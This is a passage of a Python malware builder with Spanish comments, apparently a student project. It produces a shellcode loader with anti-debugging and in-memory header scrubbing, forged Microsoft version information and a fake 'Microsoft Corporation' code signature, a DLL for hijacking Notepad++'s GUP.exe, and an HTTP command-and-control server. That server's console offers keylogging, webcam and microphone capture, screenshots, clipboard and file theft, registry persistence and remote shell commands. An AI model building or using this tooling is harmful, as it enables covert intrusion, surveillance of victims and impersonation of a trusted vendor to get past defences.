        gCH(pi.hThread); gCH(pi.hProcess);
        return TRUE;
    }}
    return FALSE;
}}

/* ── Payload ──────────────────────────────────────────────────────────────────── */
static const unsigned char KEY[]={key_arr};
static unsigned char       SC[] ={sc_arr};

/* ── Thread hiding: NtSetInformationThread(ThreadHideFromDebugger=0x11) ──────── */
static void hide_thread(pfnNtSIT NtSIT) {{
    if(NtSIT) NtSIT((HANDLE)(LONG_PTR)-2, 0x11, NULL, 0);
}}

/* ── Header scrub: borra MZ/PE de nuestra propia imagen en memoria ────────────── */
static void scrub_own_headers(pfnNtPVM NtPVM) {{
    BYTE *peb  =(BYTE*)__readgsqword(0x60);
    PVOID base =*(PVOID*)(peb+0x10);
    if(!base) return;
    PVOID fp=base; SIZE_T sz=0x1000; ULONG old=0;
    NtPVM(HPROC,&fp,&sz,PAGE_EXECUTE_READWRITE,&old);
    memset(base,0,0x1000);
    NtPVM(HPROC,&fp,&sz,old,&old);
}}

{_entrypoint}
"""

# ──────────────────────────────────────────────────────────────────────────────
# RECURSOS PE: VERSIONINFO + FIRMA DIGITAL
# ──────────────────────────────────────────────────────────────────────────────

def _generar_versioninfo_res(carpeta):
    """
    Compila .res con VERSIONINFO: el .exe aparece como 'Windows Update
    Standalone Installer' de Microsoft en Propiedades y AV scanners.
    """
    windres=shutil.which("x86_64-w64-mingw32-windres")
    if not windres: return None
    import random
    v_c=random.randint(17763,22621); v_d=random.randint(100,4500)
    rc=(
        '#include <windows.h>\n'
        'VS_VERSION_INFO VERSIONINFO\n'
        f'FILEVERSION     10,0,{v_c},{v_d}\n'
        f'PRODUCTVERSION  10,0,{v_c},{v_d}\n'
        'FILEFLAGSMASK 0x3fL\nFILEFLAGS 0x0L\n'
        'FILEOS VOS_NT_WINDOWS32\nFILETYPE VFT_APP\nFILESUBTYPE VFT2_UNKNOWN\n'
        'BEGIN\n'
        '    BLOCK "StringFileInfo"\n    BEGIN\n        BLOCK "040904B0"\n        BEGIN\n'
        '            VALUE "CompanyName",      "Microsoft Corporation"\n'
        '            VALUE "FileDescription",  "Windows Update Standalone Installer"\n'
        f'            VALUE "FileVersion",     "10.0.{v_c}.{v_d}"\n'
        '            VALUE "InternalName",     "wusa"\n'
        '            VALUE "LegalCopyright",   "(C) Microsoft Corporation. All rights reserved."\n'
        '            VALUE "OriginalFilename", "wusa.exe"\n'
        '            VALUE "ProductName",      "Microsoft Windows Operating System"\n'
        f'            VALUE "ProductVersion",  "10.0.{v_c}.{v_d}"\n'
        '        END\n    END\n'
        '    BLOCK "VarFileInfo"\n    BEGIN\n'
        '        VALUE "Translation", 0x409, 1200\n'
        '    END\nEND\n'
    )
    rc_p=os.path.join(carpeta,"_vinfo.rc")
    res_p=os.path.join(carpeta,"_vinfo.res")
    with open(rc_p,"w") as f: f.write(rc)
    subprocess.run([windres,rc_p,"-O","coff","-o",res_p],capture_output=True)
    try: os.remove(rc_p)
    except: pass
    return res_p if os.path.exists(res_p) else None

def _firmar_exe(exe_path, carpeta):
    """
    Firma con osslsigncode usando cert autofirmado 'Microsoft Corporation'.
    Chrome/Edge pasan de bloqueo inmediato a advertencia ignorable.
    """
    if not shutil.which("osslsigncode"):
        subprocess.run(["sudo","apt-get","install","-y","-q","osslsigncode"],capture_output=True)
    if not shutil.which("osslsigncode"): return
    pfx=os.path.join(carpeta,"_cs.pfx")
    if not os.path.exists(pfx):
        key=os.path.join(carpeta,"_cs.key"); crt=os.path.join(carpeta,"_cs.crt")
        subprocess.run(["openssl","req","-new","-newkey","rsa:2048","-days","3650",
                        "-nodes","-x509","-subj",
                        "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Windows",
                        "-keyout",key,"-out",crt],capture_output=True)
        subprocess.run(["openssl","pkcs12","-export","-out",pfx,
                        "-inkey",key,"-in",crt,"-passout","pass:"],capture_output=True)
        for p in [key,crt]:
            try: os.remove(p)
            except: pass
    if not os.path.exists(pfx): return
    signed=exe_path+".signed"
    subprocess.run(["osslsigncode","sign","-pkcs12",pfx,"-pass","",
                    "-n","Windows Update","-i","https://update.microsoft.com/",
                    "-in",exe_path,"-out",signed],capture_output=True)
    if os.path.exists(signed) and os.path.getsize(signed)>10000:
        os.replace(signed,exe_path); ok("Firmado digitalmente: 'Microsoft Corporation'")
    elif os.path.exists(signed):
        try: os.remove(signed)
        except: pass

def _compilar_loader(loader_c, carpeta, nombre_salida):
    ruta_c  =os.path.join(carpeta,"_loader.c")
    ruta_exe=os.path.join(carpeta,nombre_salida)
    with open(ruta_c,"w") as f: f.write(loader_c)
    gcc=shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        warn("mingw-w64 no encontrado: sudo apt install mingw-w64 -y")
        os.remove(ruta_c); return False
    res_vinfo=_generar_versioninfo_res(carpeta)
    extra_res=[res_vinfo] if res_vinfo else []
    r=subprocess.run(["nice","-n","10",gcc,ruta_c]+extra_res+["-o",ruta_exe,
        "-mwindows","-static-libgcc","-O2","-s",
        "-lws2_32","-lshell32","-lcomctl32","-lversion","-lwinmm","-limm32",
        "-Wl,--subsystem,windows"],capture_output=True)
    os.remove(ruta_c)
    if res_vinfo:
        try: os.remove(res_vinfo)
        except: pass
    if not os.path.exists(ruta_exe):
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:400])
        return False
    _firmar_exe(ruta_exe, carpeta)
    return os.path.exists(ruta_exe)

def _compilar_dll(dll_c, carpeta, nombre_salida):
    """Compila el loader C como DLL x64 para DLL hijacking."""
    ruta_c  = os.path.join(carpeta, "_loader_dll.c")
    ruta_dll= os.path.join(carpeta, nombre_salida)
    with open(ruta_c, "w") as f: f.write(dll_c)
    gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        warn("mingw-w64 no encontrado: sudo apt install mingw-w64 -y")
        os.remove(ruta_c); return False
    r = subprocess.run(["nice","-n","10", gcc, ruta_c, "-o", ruta_dll,
        "-shared",                   # DLL, no EXE
        "-static-libgcc",
        "-O2", "-s",
        "-lws2_32","-lshell32","-lcomctl32","-lversion","-lwinmm","-limm32",
        "-Wl,--subsystem,windows",
        "-Wl,--kill-at"],            # limpia nombres de export (sin @N)
        capture_output=True)
    os.remove(ruta_c)
    if not os.path.exists(ruta_dll):
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:400])
        return False
    return True

def _descargar_gup_x64(carpeta):
    """Descarga GUP.exe x64 del portable de Notepad++ (binario legítimo firmado DigiCert)."""
    import zipfile, io
    gup_path = os.path.join(carpeta, "GUP.exe")
    if os.path.exists(gup_path) and os.path.getsize(gup_path) > 50000:
        ok(f"GUP.exe ya existe ({os.path.getsize(gup_path)//1024} KB)")
        return gup_path
    # Obtener último release de Notepad++ via GitHub API
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/notepad-plus-plus/notepad-plus-plus/releases/latest",
            headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            release = json.loads(r.read())
        zip_url = None
        for asset in release.get("assets", []):
            n = asset["name"].lower()
            if "portable" in n and "x64" in n and n.endswith(".zip"):
                zip_url = asset["browser_download_url"]; break
        if not zip_url:
            warn("No se encontró portable x64 en releases de Notepad++"); return None
        info(f"Descargando portable Notepad++ x64 (~5 MB)...")
        with urllib.request.urlopen(zip_url, timeout=60) as r:
            data = r.read()
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            for name in z.namelist():
                if os.path.basename(name).lower() == "gup.exe":
                    content = z.read(name)
                    with open(gup_path, "wb") as out: out.write(content)
                    ok(f"GUP.exe x64 extraído ({len(content)//1024} KB)")
                    return gup_path
        warn("GUP.exe no encontrado dentro del zip de Notepad++"); return None
    except Exception as e:
        warn(f"Error descargando GUP.exe: {e}"); return None

def _crear_gup_xml(carpeta):
    """Crea gup.xml para que GUP.exe no crashee al arrancar."""
    xml_path = os.path.join(carpeta, "gup.xml")
    with open(xml_path, "w") as f:
        f.write('<?xml version="1.0" encoding="UTF-8"?>\n'
                '<GUP>\n'
                '    <Version>1.0.0</Version>\n'
                '    <Location>https://notepad-plus-plus.org/update/getDownloadUrl.php</Location>\n'
                '    <SilentMode>yes</SilentMode>\n'
                '</GUP>\n')
    return xml_path

def _generar_c2_server_http(carpeta, lport, xk_hex, nombre_base="kkkk"):
    """
    Genera c2_server.py para LIBRECRI C HTTP — C2 basado en HTTP polling.
    Implant hace GET /cmd (poll), POST /res (resultado).
    Incluye comandos extendidos: screenshot, download, clipboard, persist, ps, kill, etc.
    """
    srv_path = os.path.join(carpeta, "c2_server.py")

    # ── Webcam: encoded PowerShell via avicap32 (sin dependencias externas) ─
    _wcap_ps = (
        "Add-Type -Language CSharp -TypeDefinition @'\r\n"
        "using System;using System.IO;using System.Runtime.InteropServices;\r\n"
        "public class WCap{\r\n"
        "[DllImport(\"avicap32.dll\")]static extern IntPtr capCreateCaptureWindowA(string n,int f,int x,int y,int w,int h,IntPtr p,int i);\r\n"
        "[DllImport(\"user32.dll\")]static extern bool SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\r\n"
        "public static string Snap(){\r\n"
        "var t=System.IO.Path.Combine(System.IO.Path.GetTempPath(),\"wc.bmp\");\r\n"
        "var h=capCreateCaptureWindowA(\"wc\",0,0,0,640,480,IntPtr.Zero,0);\r\n"
        "if(h==IntPtr.Zero)return \"NOCAM\";\r\n"
        "SendMessage(h,0x040A,IntPtr.Zero,IntPtr.Zero);\r\n"
        "System.Threading.Thread.Sleep(1500);\r\n"
        "SendMessage(h,0x043C,IntPtr.Zero,IntPtr.Zero);\r\n"
        "IntPtr fp=System.Runtime.InteropServices.Marshal.StringToHGlobalAnsi(t);\r\n"
        "SendMessage(h,0x0417,IntPtr.Zero,fp);\r\n"
        "System.Runtime.InteropServices.Marshal.FreeHGlobal(fp);\r\n"
        "SendMessage(h,0x040B,IntPtr.Zero,IntPtr.Zero);\r\n"
        "if(!File.Exists(t))return \"NOCAM\";\r\n"
        "var b=File.ReadAllBytes(t);File.Delete(t);\r\n"
        "return Convert.ToBase64String(b);}\r\n"
        "}\r\n"
        "'@\r\n"
        "[WCap]::Snap()"
    )
    _wcap_b64 = base64.b64encode(_wcap_ps.encode("utf-16-le")).decode("ascii")
    _wcap_cmd = f"powershell -NoP -NonI -W Hidden -EncodedCommand {_wcap_b64}"

    # ── Mic: template con placeholder __SECS__ (codificado en runtime) ──────
    _mic_ps_raw = (
        "Add-Type -Language CSharp -TypeDefinition @'\r\n"
        "using System;using System.IO;using System.Runtime.InteropServices;\r\n"
        "public class MicRec{\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInOpen(out IntPtr h,int id,byte[] fmt,IntPtr cb,IntPtr i,int f);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInStart(IntPtr h);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInStop(IntPtr h);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInClose(IntPtr h);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInAddBuffer(IntPtr h,IntPtr hdr,int sz);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInPrepareHeader(IntPtr h,IntPtr hdr,int sz);\r\n"
        "[DllImport(\"winmm.dll\")]static extern int waveInUnprepareHeader(IntPtr h,IntPtr hdr,int sz);\r\n"
        "[StructLayout(LayoutKind.Sequential)]struct WHDR{public IntPtr data;public int buflen;"
        "public int bytesRec;public IntPtr user;public int flags;public int loops;public IntPtr next;public IntPtr res;}\r\n"
        "public static string Rec(int secs){\r\n"
        "byte[] fmt=new byte[18];fmt[0]=1;fmt[2]=1;\r\n"
        "int sr=16000;\r\n"
        "fmt[4]=(byte)(sr&0xFF);fmt[5]=(byte)((sr>>8)&0xFF);\r\n"
        "int ba=sr*2;fmt[8]=(byte)(ba&0xFF);fmt[9]=(byte)((ba>>8)&0xFF);\r\n"
        "fmt[12]=2;fmt[14]=16;\r\n"
        "IntPtr h;if(waveInOpen(out h,-1,fmt,IntPtr.Zero,IntPtr.Zero,0)!=0)return \"NMIC\";\r\n"
        "int bsz=sr*2*secs;byte[] buf=new byte[bsz];\r\n"
        "GCHandle gh=GCHandle.Alloc(buf,GCHandleType.Pinned);\r\n"
        "WHDR hdr=new WHDR{data=gh.AddrOfPinnedObject(),buflen=bsz};\r\n"
        "int hsz=Marshal.SizeOf(typeof(WHDR));\r\n"
        "IntPtr hp=Marshal.AllocHGlobal(hsz);Marshal.StructureToPtr(hdr,hp,false);\r\n"
        "waveInPrepareHeader(h,hp,hsz);waveInAddBuffer(h,hp,hsz);waveInStart(h);\r\n"
        "System.Threading.Thread.Sleep(secs*1000+300);\r\n"
        "waveInStop(h);waveInUnprepareHeader(h,hp,hsz);waveInClose(h);\r\n"
        "WHDR hr=(WHDR)Marshal.PtrToStructure(hp,typeof(WHDR));\r\n"
        "Marshal.FreeHGlobal(hp);gh.Free();\r\n"
        "if(hr.bytesRec<=0)return \"NMIC\";\r\n"
        "byte[] wh=new byte[]{0x52,0x49,0x46,0x46,0,0,0,0,0x57,0x41,0x56,0x45,"
        "0x66,0x6D,0x74,0x20,16,0,0,0,1,0,1,0,0x80,0x3E,0,0,0,0x7D,0,0,2,0,16,0,"
        "0x64,0x61,0x74,0x61,0,0,0,0};\r\n"
        "int rs=hr.bytesRec,fs=rs+36;\r\n"
        "wh[4]=(byte)fs;wh[5]=(byte)(fs>>8);wh[6]=(byte)(fs>>16);wh[7]=(byte)(fs>>24);\r\n"
        "wh[40]=(byte)rs;wh[41]=(byte)(rs>>8);wh[42]=(byte)(rs>>16);wh[43]=(byte)(rs>>24);\r\n"
        "MemoryStream ms=new MemoryStream();ms.Write(wh,0,44);ms.Write(buf,0,rs);\r\n"
        "return Convert.ToBase64String(ms.ToArray());}\r\n"
        "}\r\n"
        "'@\r\n"
        "[MicRec]::Rec(__SECS__)"
    )
    _mic_repr = repr(_mic_ps_raw)

    code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LIBRECRI C2 HTTP — IDEX Carlos Salazar Romero
Proyecto Seguridad de Aplicaciones
"""
import threading, queue, sys, os, base64, datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

KEY  = bytes.fromhex("{xk_hex}")
PORT = {lport}

BANNER = """
\\033[1;31m  ██████╗██████╗     ██████╗
 ██╔════╝╚════██╗   ╚════██╗
 ██║      █████╔╝    █████╔╝
 ██║     ██╔═══╝    ██╔═══╝
 ╚██████╗███████╗   ███████╗
  ╚═════╝╚══════╝   ╚══════╝\\033[0m
\\033[1;33m  LIBRECRI C2 HTTP — IDEX Carlos Salazar Romero\\033[0m
"""

AYUDA = """
\\033[1;33m[ INFORMACION ]\\033[0m
  sysinfo              info completa del sistema
  getuid               usuario actual y privilegios
  ipconfig             configuracion de red
  ps                   lista de procesos activos
  pwd                  directorio de trabajo actual

\\033[1;33m[ ARCHIVOS ]\\033[0m
  cd <ruta>            cambiar directorio de trabajo (persiste entre comandos)
  ls [ruta]            listar archivos  (default: directorio actual)
  cat <ruta>           ver contenido de archivo de texto
  download <ruta>      descargar archivo de la victima a Kali
  del <ruta>           eliminar archivo en la victima

\\033[1;33m[ SISTEMA ]\\033[0m
  screenshot           capturar pantalla (guarda PNG en ~/Desktop)
  webcam_snap          foto de la camara web (guarda BMP en ~/Desktop)
  keyscan_start        activar keylogger en la victima
  keyscan_dump         volcar teclas capturadas (limpia buffer)
  keyscan_stop         desactivar keylogger
  record_mic -d 10     grabar microfono N segundos (guarda WAV en ~/Desktop)
  clipboard            ver contenido del portapapeles
  kill <pid>           terminar proceso por PID
  persist <nombre>     agregar implant al inicio de Windows (Run key)
  users                listar todos los usuarios del sistema
  net                  informacion de red (interfaces, rutas, conexiones)

\\033[1;33m[ SHELL ]\\033[0m
  shell <cmd>          ejecutar comando en cmd.exe
  <cualquier cosa>     ejecuta directo en cmd  (ej: ipconfig, tasklist)

\\033[1;33m[ SESIONES ]\\033[0m
  sessions             ver sesion activa (IP, hora, tiempo conectado)
  close                cerrar sesion en victima (servidor sigue esperando)
  help / ?             mostrar esta ayuda
  exit / quit          cerrar sesion Y apagar servidor
"""

# PowerShell one-liners para comandos especiales
_PS_SCREENSHOT = (
    "powershell -NoP -NonI -W Hidden -C \\"Add-Type -A System.Windows.Forms,System.Drawing;"
    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
    "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
    "$g=[System.Drawing.Graphics]::FromImage($b);"
    "$g.CopyFromScreen($s.X,$s.Y,0,0,$s.Size);"
    "$m=New-Object System.IO.MemoryStream;"
    "$b.Save($m,'Png');"
    "[Convert]::ToBase64String($m.ToArray())\\""
)

_PS_WEBCAM = "{_wcap_cmd}"

_MIC_PS_RAW = {_mic_repr}

def _ps_mic(secs):
    ps = _MIC_PS_RAW.replace("__SECS__", str(secs))
    return "powershell -NoP -NonI -W Hidden -EncodedCommand " + base64.b64encode(ps.encode("utf-16-le")).decode("ascii")

def _ps_download(path):
    return ("powershell -NoP -NonI -W Hidden -C \\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('" + path + "'))\\""  )

def _ps_clipboard():
    return "powershell -NoP -NonI -W Hidden -C \\"Get-Clipboard\\""

def _ps_persist(exe_path, reg_name):
    return ("reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run "
            "/v " + reg_name + " /t REG_SZ /d " + exe_path + " /f")

def xor(data):
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))

_cmd_lock    = threading.Lock()
_pending     = None
_result_q    = queue.Queue()
_connected   = threading.Event()
_session_lk  = threading.Lock()
_session     = {{}}
_known_ips   = {{}}
_known_ips_lk = threading.Lock()

_in_session  = False
_CWD         = [None]   # directorio de trabajo actual del implant

def _S(cmd, timeout=25):
    """Envia comando shell prefijando cd /d <cwd> si hay directorio activo."""
    full = ('cd /d "' + _CWD[0] + '" && ' + cmd) if _CWD[0] else cmd
    return _send(full, timeout=timeout)

class _H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass

    def do_GET(self):
        global _pending
        if self.path != "/cmd":
            self.send_response(404); self.end_headers(); return
        _ip  = self.client_address[0]
        _mid = self.headers.get("X-MID", "?")
        with _known_ips_lk:
            if _ip not in _known_ips:
                _known_ips[_ip] = {{"count": 1, "mid": _mid}}
                print("\033[1;33m[+] NUEVA maquina: " + _ip + " (" + _mid + ")\033[0m")
            else:
                _known_ips[_ip]["count"] += 1
                _cnt = _known_ips[_ip]["count"]
                if not _in_session:
                    print("\033[0;36m[~] Reconexion #" + str(_cnt) + " de " + _ip + " (" + _mid + ")\033[0m")
        with _session_lk:
            if not _session:
                _session["ip"]           = _ip
                _session["port"]         = self.client_address[1]
                _session["mid"]          = _mid
                _session["connected_at"] = datetime.datetime.now()
        _connected.set()
        with _cmd_lock:
            cmd = _pending
            _pending = None
        if cmd:
            enc = xor(cmd.encode())
            self.send_response(200)
            self.send_header("Content-Length", str(len(enc)))
            self.end_headers()
            self.wfile.write(enc)
        else:
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_POST(self):
        if self.path != "/res":
            self.send_response(404); self.end_headers(); return
        n = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(n)
        _result_q.put(xor(data))
        self.close_connection = True
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

def _send(wire, timeout=25):
    global _pending
    with _cmd_lock: _pending = wire
    try:
        return _result_q.get(timeout=timeout)
    except queue.Empty:
        return None

def _txt(raw):
    if raw is None:
        print("\\033[1;31m[-] Timeout — sin respuesta\\033[0m")
        return
    print(raw.decode("utf-8", errors="replace"),
          end="" if raw.endswith(b"\\n") else "\\n")

def _fmt_uptime(delta):
    total = int(delta.total_seconds())
    h, r  = divmod(total, 3600)
    m, s  = divmod(r, 60)
    parts = []
    if h: parts.append(str(h) + "h")
    parts.append(str(m) + "m")
    parts.append(str(s) + "s")
    return " ".join(parts)

def operator():
    print(BANNER)
    print("\\033[1;34m[*] Servidor HTTP C2 en 0.0.0.0:" + str(PORT) + "\\033[0m")

    while True:
        _connected.clear()
        with _session_lk: _session.clear()
        while not _result_q.empty():
            try: _result_q.get_nowait()
            except: pass

        print("\\033[0;33m[*] Esperando que la victima ejecute el archivo...\\033[0m\\n")
        _connected.wait()

        with _session_lk:
            sip  = _session.get("ip", "?")
            sprt = _session.get("port", "?")
            sat  = _session.get("connected_at", datetime.datetime.now())

        # ── HANDSHAKE — soft: intenta echo, acepta si implant sigue activo ──
        with _cmd_lock: _pending = "echo LIBRECRI_OK"
        _hs_pass = False
        try:
            hs_raw = _result_q.get(timeout=10)
            hs_txt = hs_raw.decode("utf-8", errors="ignore")
            if "LIBRECRI_OK" in hs_txt:
                _hs_pass = True
            else:
                print("\\033[0;33m[!] " + str(sip) + " — claves incorrectas (exe viejo) — regenera y re-descarga el exe\\033[0m")
                with _cmd_lock: _pending = None
                continue
        except queue.Empty:
            with _known_ips_lk:
                _poll_cnt = _known_ips.get(sip, {{}}).get("count", 0)
            if _poll_cnt >= 3:
                print("\\033[0;33m[~] " + str(sip) + " — POST/res no llego pero implant activo (" + str(_poll_cnt) + " polls) — sesion aceptada\\033[0m")
                with _cmd_lock: _pending = None
                _hs_pass = True
            else:
                print("\\033[0;33m[!] " + str(sip) + " — timeout y sin actividad suficiente, ignorando\\033[0m")
                with _cmd_lock: _pending = None
                continue
        if not _hs_pass:
            continue

        # ── PID del implant ────────────────────────────────────────────
        with _cmd_lock: _pending = "wmic process where \\"Name='{nombre_base}.exe'\\" get ProcessId /format:value"
        try:
            pid_raw = _result_q.get(timeout=8)
            pid_txt = pid_raw.decode("utf-8", errors="ignore")
            import re as _re
            m = _re.search(r"ProcessId=(\\d+)", pid_txt)
            _session["pid"] = m.group(1) if m else None
        except queue.Empty:
            _session["pid"] = None

        imp_pid = _session.get("pid")
        pid_info = (" PID=" + imp_pid) if imp_pid else ""
        print("\\033[1;32m[+] Sesion abierta — " + str(sip) + ":" + str(sprt) + pid_info + "\\033[0m")
        print("\\033[0;33m[*] Escribe \\'help\\' para ver comandos\\033[0m\\n")

        global _in_session
        _in_session = True
        _shutdown = False

        while True:
            try:
                _cwd_disp = ("\\033[0;33m " + _CWD[0] + "\\033[0m") if _CWD[0] else ""
                raw = input("\\033[1;36mmeterpreter\\033[0m" + _cwd_disp + " > ").strip()
            except (EOFError, KeyboardInterrupt):
                _send("EXIT", timeout=3)
                print("\\n\\033[0;33m[*] Cerrando servidor...\\033[0m")
                _shutdown = True; break

            if not raw: continue
            lo = raw.lower()

            # ── AYUDA ──────────────────────────────────────────────────────
            if lo in ("help", "?"):
                print(AYUDA); continue

            # ── SESSIONS ───────────────────────────────────────────────────
            if lo == "sessions":
                now = datetime.datetime.now()
                up  = _fmt_uptime(now - sat)
                _ipid = _session.get("pid", "?")
                print("\\033[1;33m  ID  IP                PUERTO  PID    CONECTADO            UPTIME\\033[0m")
                print("  \\033[1;32m1\\033[0m   " + str(sip).ljust(16) + "  " +
                      str(sprt).ljust(6) + "  " + str(_ipid).ljust(6) + "  " +
                      sat.strftime("%Y-%m-%d %H:%M:%S") + "  " + up)
                continue

            # ── CD — cambia directorio de trabajo del implant ──────────────
            if lo == "cd" or lo.startswith("cd "):
                tgt = raw[3:].strip() if len(raw) > 2 else ""
                if not tgt or tgt in ("~", "~\\\\", "~/"):
                    r = _send("echo %USERPROFILE%", timeout=8)
                    if r:
                        _CWD[0] = r.decode("utf-8", errors="replace").strip()
                        print("\\033[0;36m[CWD] " + _CWD[0] + "\\033[0m")
                    else:
                        print("\\033[1;31m[-] Timeout\\033[0m")
                else:
                    _pfx = ('cd /d "' + _CWD[0] + '" && ') if _CWD[0] else ""
                    r = _send(_pfx + 'cd /d "' + tgt + '" && cd', timeout=8)
                    if r:
                        _lines = [l.strip() for l in r.decode("utf-8", errors="replace").splitlines() if l.strip()]
                        if _lines:
                            _CWD[0] = _lines[-1]
                            print("\\033[0;36m[CWD] " + _CWD[0] + "\\033[0m")
                        else:
                            print("\\033[1;31m[-] No se pudo cambiar directorio (ruta invalida)\\033[0m")
                    else:
                        print("\\033[1;31m[-] Timeout\\033[0m")
                continue

            # ── CLOSE — mata implant, espera nueva sesion ──────────────────
            if lo in ("close", "background", "bg"):
                _ipid = _session.get("pid")
                if _ipid:
                    _send("taskkill /F /PID " + _ipid, timeout=5)
                _send("EXIT", timeout=3)
                _in_session = False
                _CWD[0] = None
                print("\\033[0;33m[*] Implant terminado. Esperando nueva conexion...\\033[0m\\n")
                break

            # ── EXIT / QUIT — mata implant y apaga servidor ────────────────
            if lo in ("exit", "quit", "bye"):
                _ipid = _session.get("pid")
                if _ipid:
                    _send("taskkill /F /PID " + _ipid, timeout=5)
                _send("EXIT", timeout=3)
                print("\\033[0;33m[*] Servidor apagado\\033[0m\\n")
                _shutdown = True; break

            # ── SCREENSHOT ─────────────────────────────────────────────────
            if lo == "screenshot":
                print("\\033[0;33m[*] Capturando pantalla...\\033[0m")
                result = _send(_PS_SCREENSHOT, timeout=30)
                if result is None:
                    print("\\033[1;31m[-] Timeout\\033[0m"); continue
                try:
                    b64 = ''.join(result.decode("utf-8", errors="ignore").split())
                    b64 += '=' * (-len(b64) % 4)
                    img = base64.b64decode(b64)
                    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    desk = os.path.join(os.path.expanduser("~"), "Desktop")
                    os.makedirs(desk, exist_ok=True)
                    fn   = os.path.join(desk, "screenshot_" + ts + ".png")
                    with open(fn, "wb") as fh: fh.write(img)
                    print("\\033[1;32m[+] Guardado: " + fn +
                          " (" + str(len(img)//1024) + " KB)\\033[0m")
                except Exception as ex:
                    print("\\033[1;31m[-] Error: " + str(ex) + "\\033[0m")
                continue

            # ── DOWNLOAD ───────────────────────────────────────────────────
            if lo.startswith("download "):
                rpath = raw[9:].strip()
                print("\\033[0;33m[*] Descargando " + rpath + "...\\033[0m")
                result = _send(_ps_download(rpath), timeout=30)
                if result is None:
                    print("\\033[1;31m[-] Timeout\\033[0m"); continue
                try:
                    b64  = result.decode("utf-8", errors="ignore").strip()
                    fdat = base64.b64decode(b64)
                    fn   = os.path.basename(rpath.replace("\\\\", "/"))
                    with open(fn, "wb") as fh: fh.write(fdat)
                    print("\\033[1;32m[+] Guardado: " + os.path.abspath(fn) +
                          " (" + str(len(fdat)//1024) + " KB)\\033[0m")
                except Exception as ex:
                    print("\\033[1;31m[-] Error: " + str(ex) + "\\033[0m")
                continue

            # ── CLIPBOARD ──────────────────────────────────────────────────
            if lo == "clipboard":
                _txt(_send(_ps_clipboard()))
                continue

            # ── WEBCAM SNAP ────────────────────────────────────────────────
            if lo == "webcam_snap":
                print("\\033[0;33m[*] Capturando camara web (2-3s)...\\033[0m")
                result = _send(_PS_WEBCAM, timeout=25)
                if result is None:
                    print("\\033[1;31m[-] Timeout\\033[0m"); continue
                try:
                    txt = ''.join(result.decode("utf-8", errors="ignore").split())
                    if not txt or txt.startswith("NOCAM"):
                        print("\\033[1;33m[!] Sin camara o no soportada\\033[0m"); continue
                    txt += '=' * (-len(txt) % 4)
                    img  = base64.b64decode(txt)
                    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    desk = os.path.join(os.path.expanduser("~"), "Desktop")
                    os.makedirs(desk, exist_ok=True)
                    fn   = os.path.join(desk, "webcam_" + ts + ".bmp")
                    with open(fn, "wb") as fh: fh.write(img)
                    print("\\033[1;32m[+] Guardado: " + fn + " (" + str(len(img)//1024) + " KB)\\033[0m")
                except Exception as ex:
                    print("\\033[1;31m[-] Error: " + str(ex) + "\\033[0m")
                continue

            # ── KEYSCAN START ──────────────────────────────────────────────
            if lo == "keyscan_start":
                result = _send("KSTART", timeout=8)
                if result:
                    print("\\033[1;32m[+] Keylogger activo\\033[0m")
                else:
                    print("\\033[1;31m[-] Timeout\\033[0m")
                continue

            # ── KEYSCAN DUMP ───────────────────────────────────────────────
            if lo == "keyscan_dump":
                result = _send("KDUMP", timeout=8)
                if result is None:
                    print("\\033[1;31m[-] Timeout\\033[0m"); continue
                txt = result.decode("utf-8", errors="replace").strip()
                if txt:
                    print("\\033[1;33m[+] Teclas capturadas:\\033[0m\\n" + txt)
                else:
                    print("\\033[0;36m[~] Buffer vacio\\033[0m")
                continue

            # ── KEYSCAN STOP ───────────────────────────────────────────────
            if lo == "keyscan_stop":
                result = _send("KSTOP", timeout=8)
                if result:
                    print("\\033[1;32m[+] Keylogger detenido\\033[0m")
                else:
                    print("\\033[1;31m[-] Timeout\\033[0m")
                continue

            # ── RECORD MIC ─────────────────────────────────────────────────
            if lo.startswith("record_mic"):
                _parts = lo.split()
                _secs  = 10
                if "-d" in _parts:
                    try: _secs = int(_parts[_parts.index("-d") + 1])
                    except: _secs = 10
                print("\\033[0;33m[*] Grabando " + str(_secs) + "s de microfono...\\033[0m")
                result = _send(_ps_mic(_secs), timeout=_secs + 35)
                if result is None:
                    print("\\033[1;31m[-] Timeout\\033[0m"); continue
                try:
                    txt = ''.join(result.decode("utf-8", errors="ignore").split())
                    if not txt or txt.startswith("NMIC"):
                        print("\\033[1;33m[!] Sin microfono o error de dispositivo\\033[0m"); continue
                    txt += '=' * (-len(txt) % 4)
                    wav  = base64.b64decode(txt)
                    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    desk = os.path.join(os.path.expanduser("~"), "Desktop")
                    os.makedirs(desk, exist_ok=True)
                    fn   = os.path.join(desk, "mic_" + ts + ".wav")
                    with open(fn, "wb") as fh: fh.write(wav)
                    print("\\033[1;32m[+] Guardado: " + fn + " (" + str(len(wav)//1024) + " KB)\\033[0m")
                except Exception as ex:
